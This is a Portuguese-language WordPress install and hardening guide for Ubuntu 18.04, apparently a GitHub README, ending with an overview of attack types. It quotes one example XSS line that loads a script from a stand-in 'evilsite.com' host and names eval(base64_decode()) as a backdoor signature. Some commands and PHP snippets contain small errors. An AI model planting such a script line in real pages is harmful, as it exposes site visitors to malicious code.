# Instalação Wordpress básica em servidor Ubuntu 18.04 #

**1. Em uma instalação limpa do Ubuntu 18.04 faça um update do package manager e instale o Apache:**

```bash
sudo apt update
sudo apt install apache2
```
**2. Instale o Curl**
```bash
sudo apt install curl
```

**3. Instale o Mysql**
```bash
sudo apt install mysql-server
```
###### Obs.: Caso use o mysql em outro servidor não será necessário a instalação do mysql server.
**4. Dê uma senha para o usuário root do mysql**
```MYSQL
sudo mysql
Select user,authentication_string,plugin,host FROM mysql.user;
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
```
**5. Rode o Flush Privileges para restartar a tabela de concessão do serviço mysql**
```MYSQL
FLUSH PRIVILEGES;
exit
```
**6. Crie um banco de dados MYSQL e um USUÁRIO para o Wordpress**
```MYSQL 
mysql -u root -p
CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;
GRANT ALL ON wordpress.* TO 'wordpressuser'@'localhost' IDENTIFIED BY 'password';
FLUSH PRIVILEGES;
exit 
```
**7. Instale o PHP**
```BASH
apt-get update
sudo apt-get install php-curl php-gd php-mbstring php-mcrypt php-xml php-xmlrpc
```
######  Obs.: Caso queira uma versão anterior do php utilize o número logo depois de php, exemplo : php7.2-curl php7.2-gd ... 

**8. Reinicie o apache**
```bash
sudo systemctl restart apache2
```
**9. Habilitar o Mod_rewrite para usar os permalinks do Wordpress**
```bash
sudo a2enmod rewrite
```
**10. Habilitar substituições .htaccess**
######Para permitir arquivos .htaccess, é necessário definir a diretiva AllowOverride dentro do bloco Directory apontando para a pasta raíz:

> **nano /etc/apache2/apache2.conf**

```BASH
. . . 
<Directory /var/www/>
    AllowOverride All
</Directory>
. . . 
```
Salve o arquivo com Ctrl+X + Y

**11. Habilite as alterações e reinicie**
```bash
sudo apache2ctl configtest
sudo systemctl restart apache2
```

**12. Configurando Hosts Virtuais** 

Dentro da pasta /var/www crie a pasta do site
```bash
sudo mkdir /var/www/NOMEDOSITE
```
Atribua a propriedade do diretório ao usuário ubuntu
```bash
sudo chown -R $USER:$USER /var /www/NOMEDOSITE
```
Crie um novo arquivo de conf em /etc/apache2/sites-available/NOMEDOSITE.conf
```bash
sudo nano /etc/apache2/sites-available/NOMEDOSITE.conf
```

 > **/etc/apache2/sites-available/NOMEDOSITE.conf** 
 ```BASH  
  <VirtualHost *:80>
    ServerAdmin webmaster@localhost
    ServerName NOMEDOSITE
    ServerAlias www.NOMEDOSITE
    DocumentRoot /var/www/NOMEDOSITE
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
 </VirtualHost>
```

Habilite o arquivo com o a2ensite

```bash
sudo a2ensite NOMEDOSITE.conf
```

Teste se existe algum erro de configuração:

```bash
sudo apache2ctl configtest
```

Estando tudo certo reinicie o apache

```bash
sudo systemctl restart apache2
```

**13. Baixe ou copie o projeto wordpress para a pasta /var/www/**

Para o caso de uma instalação nova:
```bash
cd /tmp
curl -O https://br.wordpress.org/latest-pt_BR.tar.gz 
```
Extraia o arquivo e mova para a pasta /www
```bash
tar xzvf latest-pt_BR.tar.gz
sudo cp -a /tmp/wordpress/. /var/www/NOMEDOSITE
```
**15. Ajuste a Propriedade e permissões**
```bash
sudo chown -R ubuntu:www-data /var/www/
sudo find /var/www/NOMEDOSITE -type d -exec chmod g+s {} \;
```
Ajustando permissão de escrita para o grupo para o diretório /wp-content 
```bash
sudo chmod g+w /var/www/NOMEDOSITE/wp-content
```

Como parte desse processo, daremos ao servidor web acesso de escrita a todo o conteúdo nesses dois diretórios:
```bash 
sudo chmod -R g+w /var/www/NOMEDOSITE/wp-content/themes
sudo chmod -R g+w /var/www/NOMEDOSITE/wp-content/plugins
```

**16. Ajuste o wp-config.php**
```Perl
/var/www/NOMEDOSITE/wp-config.php
```
```PHP
. . .

define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'password');

. . .

define('FS_METHOD', 'direct');
```
**17. Complete a instalação através da interface web**

Ajuste permissões para atualizar
Quando uma atualização se torna disponível, acesse novamente seu servidor como usuário do sudo. Temporariamente conceda ao processo do servidor web, acesso à pasta raiz inteira.
```bash
sudo chown -R www-data /var/www/html
```
Volte ao painel de administração do Wordpress e aplique a atualização.
Quando tiver terminado, volte com as permissões anteriores novamente:
```bash
sudo chown -R ubuntu /var/www/html
```
Isso deve ser necessário apenas quando você estiver aplicando atualizações ao próprio WordPress.

**18. Continue com as recomendações de segurança abaixo.** 

## Principais Recomendações de Segurança ##

**1. Utilizar a versão mais recente do PHP.**

A partir da  versão 7 do PHP somente os Branch com até dois anos terão suporte em atualização de bugs e segurança, por exemplo a versão 7.3 lançada em dezembro de 2018 terá suporte de segurança até dezembro de 2021.

**2. Usar nomes de usuários e senhas inteligentes**

Utilizar logins e senhas únicas para cada site além das ferramentas de criação de logins fortes que o próprio Wordpress disponibiliza. 

**3. Atualize sempre as versões mais recentes do Wordpress, Plugins e temas** 

Sempre que for utilizar um plugin ou tema que não seja do repositório do Wordpress, utilizar uma ferramenta on-line de scaneamento de malware como o [Virus Total](https://www.virustotal.com/gui/home/upload).

**4. Bloquear a área de administração do Wordpress**

* Utilizar um nome alternativo para o endereço de administração (wp-admin); 
* Forçar a autenticação de dois fatores;
* Limitar tentativas por IP;
* Utilizar autenticação básica por htpasswd;
* Restringir o acesso a administração somente de um IP conhecido

**5. Reforce a segurança do wp-config.php**

O __wp-config.php__ como o nome sugere é o principal arquivo de configuração de um sistema Wordpress, contém informações de login e banco de dados extremamente sensíveis, além das chaves de segurança que manipulam a criptografia das informações nos cookies. 
As principais ações no que tange a segurança deste arquivo são:
* Mover o wp-config.php da raiz do projeto, procure mantê-lo um diretório acima do diretório raiz;
* Atualizar as chaves de segurança; sempre que necessário utilize : 
```bash
curl -s https://api.wordpress.org/secret-key/1.1/salt/
```
* Alterar as permissões para 600 


**6. Utilizar plugins de segurança do Wordpress**

As principais soluções :

* Sucuri Security
* iThemes Security
* WordFence Security
* WP fail2ban
* SecuPress

**Principais funções:** 

* Gerar e forçar senhas fortes ao criar perfis de usuário
* Forçar que as senhas expirem e sejam redefinidas regularmente
* Registro de ações do usuário
* Atualizações fáceis de chaves de segurança do WordPress
* Análise de Malware
* Autenticação de dois fatores
* reCAPTCHAs
* Firewalls de segurança do WordPress
* Lista de permissões de IP
* Lista negra de IP
* Logs de alteração de arquivo
* Monitorar alterações de DNS
* Bloquear redes maliciosas
* Ver informações WHOIS sobre visitantes

>Talvez a característica mais importante e por que se deve usar um plugin de segurança no Wordpress é que a maioria utiliza um utilitário de soma de verificação (Checksums). Através da comparação com os arquivos core do Wordpress.org o Plugin varre o ambiente em busca de arquivos ou pastas  alteradas ou modificadas.  

**7. Atenção especial ao banco de dados**

* Atenção ao prefixo do banco  (renomeie sempre o wp_ por outro prefixo mais seguro)
* Se possível crie um usuário de banco específico para o ambiente com permissões restritas somente aquele banco, JAMAIS use o root do banco.
* Execute ou tenha scripts de back-up rotineiramente.

**8. Permissões do servidor**

As recomendações típicas para permissões são:

* Todos os arquivos devem ser 644 ou 640. Exceção: o wp-config.php e o debug.log devem ser 600.
* Todos os diretórios devem ser 755 ou 750.
* Nenhum diretório deveria receber 777, nem mesmo fazer o upload de diretórios.
* O melhor a fazer é restringir ao máximo as permissões dos arquivos e pastas e ir liberando apenas os casos que necessitem de permissão de escrita como a pasta Upload.
* A sua conta de usuário (Ubuntu, por exemplo) deve ser a dona de todos os arquivos, tendo acesso de escrita a todos eles. Os arquivos que necessitem de escrita pelo Wordpress (www-data no Debian) devem estar em um grupo, também pertencente a conta de usuário utilizada no servidor.

Novamente o iThemes Security possui um utilitário para verificar se as permissões no seu site estão corretas.

![Permissões](https://github.com/magororj/WordpressInstallTips/blob/master/image1.png)

Segundo o [Codex](https://codex.wordpress.org/pt-br:Blindando_o_WordPress), as principais pastas do Wordpress devem estar com as seguintes permissões habilitadas: 
```/```
O diretório raiz do WordPress: todos os arquivos devem ter permissão de escrita somente pelo seu usuário, exceto o .htaccess se você quiser que o WordPress gere automaticamente as regras de reescrita para você.
```/wp-admin/```
A área de administração do WordPress: todos os arquivos devem ter permissão de escrita somente pelo seu usuário.
```/wp-includes/```
A maior parte da lógica de sistema do WordPress: todos os arquivos devem ter permissão de escrita somente pelo seu usuário.
```/wp-content/```
Conteúdo inserido pelos usuários: estes arquivos devem ter permissão de escrita por todos os usuários (proprietário/usuário, grupos e público).

Dentro de ```/wp-content/``` você vai encontrar:

```/wp-content/themes/```
Arquivos de temas/templates. Se você quiser utilizar o editor de temas do painel de administração, todos os arquivos devem ter permissão de escrita. Se não, todos podem ser escritos somente pela sua conta de usuário.
```/wp-content/plugins/```
Arquivos de plugins: todos os arquivos devem ter permissão de escrita somente pelo seu usuário.

Outras pastas que podem existir em ```/wp-content/``` devem estar documentadas pelos temas ou plugins que as necessitam. As permissões podem variar.

**9. Desativar a edição de arquivos no painel do Wordpress** 

Ao mesmo tempo que este recurso é útil, pode trazer muitos danos. Se um hacker consegue acesso ao seu painel do administrador, a primeira coisa que ele vai conferir é o Editor de Arquivos. Alguns usuários WordPress preferem desabilitar este recurso completamente.
Você pode desabilitá-lo, editando o arquivo **wp-config.php** e adicionando o seguinte código:
```PHP 
define( 'DISALLOW_FILE_EDIT', true );
```

**10. Faça tunning do ModSecurity no apache (ModSec)**

O **ModSecurity** é um aplicativo de firewall de código aberto (ou WAF) suportado por diferentes servidores da Web, como Apache, Nginx e IIS, e protege aplicativos da Web como o WordPress contra vários ataques de injeção de código. Ele usa expressões regulares e conjuntos de regras para bloquear injeções de código conhecidas.

Manter ModSecurity ativado aumenta em muito as barreiras de defesa do seu servidor. Por padrão as configurações do ModSecurity afetam alguns recursos do Wordpress como o upload de arquivos e o login na administração do site.

Para adicionar regras específicas para exclusão do Wordpress em ModSecurity :

* Encontre o arquivo whitelist.conf ou exclude.conf , geralmente em ```/usr/local/apache/conf/modsec2/```

* Adicione as seguintes regras:
```BASH
<locationmatch "/wp-admin/admin-ajax.php">
SecRuleRemoveById 300013
SecRuleRemoveById 300015
SecRuleRemoveById 300016
SecRuleRemoveById 300017
SecRuleRemoveById 949110
SecRuleRemoveById 980130
</locationmatch>

<locationmatch "/wp-admin/page.php">
SecRuleRemoveById 300013
SecRuleRemoveById 300015
SecRuleRemoveById 300016
SecRuleRemoveById 300017
SecRuleRemoveById 949110
SecRuleRemoveById 980130
</locationmatch>

<locationmatch "/wp-admin/post.php">
SecRuleRemoveById 300013
SecRuleRemoveById 300015
SecRuleRemoveById 300016
SecRuleRemoveById 300017
SecRuleRemoveById 949110
SecRuleRemoveById 980130
</locationmatch>
```

**11. Utilize um CDN com cobertura contra DDoS**

Ter um bom CDN para manter os arquivos estáticos além de aliviar o tráfego, e como consequência o consumo de recursos do seu servidor, ainda confere segurança ao site pois o mesmo atua como uma barreira física, bloqueando as tentativas de invasão antes mesmo de chegar no servidor.

**12. Certifique-se que o debug esteja desabilitado e protegido em produção**

O arquivo de debug registra informações sensíveis da aplicação como o path. Se por algum motivo for necessário utilizar o debug em produção faça isso com extrema cautela e desative tão logo que possível. Mantenha uma permissão segura para o arquivo debug.log evitando que o mesmo seja acessado externamente.

As constantes de configuração do modo debug que devem ser adicionadas ao **wp-config.php**: 

```PHP
define( 'WP_DEBUG', true ) // ativa o modo debug, use false para manter desativado
define( 'WP_DEBUG_LOG', true )
@ini_set( 'log_errors', 'On' )
define( 'WP_DEBUG_DISPLAY', false )
@ini_set( 'display_errors', 'Off' )
```
**13. Exclua arquivos desnecessários do core**
	
Exclua sem dó:
>**/wp-config-sample.php
/readme.html
/license.txt
/wp-admin/install.php**

**14. Diminua a tentativa de SPAM com diretivas específicas no .htaccess**
```bash
 # Avoid SPAM and CSRF
<IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteCond %{REQUEST_METHOD} POST
 RewriteCond %{REQUEST_URI} .(wp-comments-post|wp-login)\.php*
 RewriteCond %{HTTP_REFERER} !.*exemplo-dominio.* [OR]
 RewriteCond %{HTTP_USER_AGENT} ^$
 RewriteRule (.*) http://%{REMOTE_ADDR}/$ [R=301,L]
</ifModule>
```

**15. Faça backups sempre!** 

## Principais formas de vulnerabilidade ##

### Backdoors
Ocorre decorrente a exploração de brechas devido a códigos permissivos ou ainda, plugins, templates ou o core do Wordpress desatualizado. Geralmente a invasão explora a execução não autorizada de arquivos PHP ou o acesso indevido a administração do site (login de fácil descoberta).

Quase sempre criptografados para se parecerem como arquivos legítimos do wordpress, podem ser descobertos por rotinas de [escaneamento](http://cantonbecker.com/etcetera/2009/how-to-search-for-backdoors-in-a-hacked-wordpress-site/) a procura de comandos php específicos como eval(base64_decode()) por exemplo.

As formas de proteção geralmente incluem a autenticação de dois fatores , bloqueio de ip por excesso de tentativa a login, e tratamento das pastas contra execução de código onde não deve , como a pasta Upload por exemplo.
### Hacks
São uma forma de Backdoor que trabalha de forma oculta, o objetivo é o uso do ambiente para disseminação de anúncios (span) dos mais variados tipos  (medicamentos, pornô, Jogos de azar, etc) de forma que quanto mais tempo ficar invisível com relação a operação do site melhor, entretanto como ele atua diretamente para os mecanismos de buscas (Googlebots) os próprios mecanismos se encarregam no banimento e desclassificação do site hospedeiro por disseminação de span.

As principais formas de acesso ao servidor são plugins desatualizados ou baixados em sites piratas. Além dos outros já citados acima.

### Força Bruta
Através de scripts em linha de comando, esse tipo de exploração visa exatamente a exploração dos arquivos de login do wordpress (wp-login.php) afim de realizar tentativas ininterruptas de login, visando a obtenção de logins óbvios ou senhas fracas.

Novamente a autenticação em duas etapas e a limitação de tentativas de login, além de monitoramento e bloqueio automatizado de ip são formas de bloquear esse tipo de backdoor.

### Redirecionamentos Maliciosos
Exploram as falhas de configuração e proteção de arquivos e pastas importantes (Pastas Upload, Plugins, Templates ou arquivos functions.php, wp-config.php ou .htaccess) do Wordpress para realização de redirecionamentos a outros sites ou até mesmo a injeção de scripts maliciosos na máquina do visitante, as principais forma são:

### Cross-site Scripting (XSS)
O invasor usa o código malicioso para gerar redirecionamento para outros sites , obtenção de dados de cookie ou de sessão. Podem até fazer um mascaramento do site original iludindo o visitante, fazendo o mesmo achar que está em um site seguro podendo assim inserir senhas de login ou outras informações sensíveis (Pessoais, bancárias, etc) 

Exemplo de código malicioso injetado no site: 
```html
<script src = "http://evilsite.com/badscript.js"> </script>
```
Formulários sem proteção para validação e higienização dos dados inseridos são as formas mais comuns de acesso ao banco e ao ambiente do site para esse tipo de redirecionamento. O Wordpress possui vários [métodos para Validação, Sanitização e proteção de formulários](https://i1.wp.com/secure.wphackedhelp.com/blog/wp-content/uploads/2018/03/XSS-Attack-in-WordPress-_Developers-Guide-to-prevent.png?w=761&ssl=1) contra a injeção de funções. 
 
Bloquear sempre que possível a inserção de comentários no site, se for o caso, utilizar plugins específicos para comentários.

![Esquema de ataque do tipo XSS (fonte: https://secure.wphackedhelp.com/blog/wordpress-xss-attack/)
](https://github.com/magororj/WordpressInstallTips/blob/master/image1.png)

### Denial of service (DoS attack)
Talvez  o tipo de ataque mais perigoso de todos, capaz de colapsar um ou vários servidores em conjunto. Seja por motivação financeira ou ideológica, esse tipo de invasão sobrecarrega a memória dos servidores alvos ou ainda, promove o orquestramento de acessos ininterruptos a um site alvo na tentativa de derrubá-lo. 

### Referências Pesquisadas
1. https://kinsta.com/pt/blog/seguranca-wordpres/ (acessado em 23/03/20)
2. https://secure.wphackedhelp.com/blog/eval-base64-decode-hack-wordpress/ (acessado em 25/03/20)
3. https://secure.wphackedhelp.com/blog/wordpress-xss-attack/ (acessado em 24/03/20)
4. http://cantonbecker.com/etcetera/2009/how-to-search-for-backdoors-in-a-hacked-wordpress-site/ (acessado em 23/03/20)
5. https://blog.apiki.com/13-passos-seguranca-do-wordpress/ (acessado em 23/03/20)
6. https://dipakgajjar.com/fix-403-forbidden-error-in-wordpress-modsecurity/ (acessado em 25/03/20)
7. https://www.digitalocean.com/community/tutorials/como-instalar-o-wordpress-com-lamp-no-ubuntu-16-04-pt (acessado em 23/03/20)
8. https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-ubuntu-18-04 (acessado em 23/03/20)